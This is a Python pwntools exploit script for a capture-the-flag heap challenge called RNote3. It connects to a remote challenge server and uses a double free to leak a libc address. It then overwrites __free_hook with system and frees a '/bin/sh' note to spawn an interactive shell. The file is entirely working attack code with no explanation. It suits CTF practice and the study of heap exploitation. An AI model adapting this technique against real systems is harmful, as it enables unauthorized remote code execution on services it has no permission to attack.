from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./RNote3"
bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

#conn = process(file, env=env)
conn = remote("rnote3.2018.teamrois.cn", 7322)
#gdb.attach(conn)

def menu(ch):
    #conn.recvuntil("5. Exit")
    conn.sendline(str(ch))

def add(title, size, content):
    menu(1)
    conn.recvuntil("title:")
    conn.send(title)
    conn.recvuntil("size:")
    conn.sendline(str(size))
    conn.recvuntil("content:")
    conn.send(content)

def view(title):
    menu(2)
    conn.recvuntil("title:")
    conn.send(title)

def edit(title, content):
    menu(3)
    conn.recvuntil("title:")
    conn.send(title)
    conn.recvuntil("content:")
    conn.send(content)

def delete(title):
    menu(4)
    conn.recvuntil("title:")
    conn.send(title)

# Double free
add("t1\n", 0x80, "/bin/sh\x00\n")
add("t2\n", 0x80, "aaaaa\n")
add("t22\n", 0x60, "aaaa\n")
add("t3\n", 0x40, "bbbb\n")
add("t4\n", 0x18, "cccc\n")
add("t5\n", 0x100, "dddd\n")
delete("t3\n")
delete("t5\n")
delete("t4\n")
delete("blah\n")
add("t6\n", 0x80, "ffff\n")
payload = "t6".ljust(0x8, "\x00") + p64(0x10) + "\n"
add("t7\n", 0x18, payload)
view("t6\n")
conn.recvuntil("note content: ")

libc_leak = u64(conn.recvn(6) + "\x00\x00")
#libc.address = libc_leak - 0x00007f8b5cd9ebd8 + 0x7f8b5c9da000
libc.address = libc_leak - 0x7f553c7f1bd8 + 0x7f553c42d000

log.info("Libc leak: " + hex(libc_leak))

payload = "t6".ljust(0x8, "\x00") + p64(0x8) \
          + p64(libc.symbols['__free_hook'])
edit("t7\n", payload)
edit("t6\n", p64(libc.symbols['system']))

delete("t1\n")

conn.interactive()
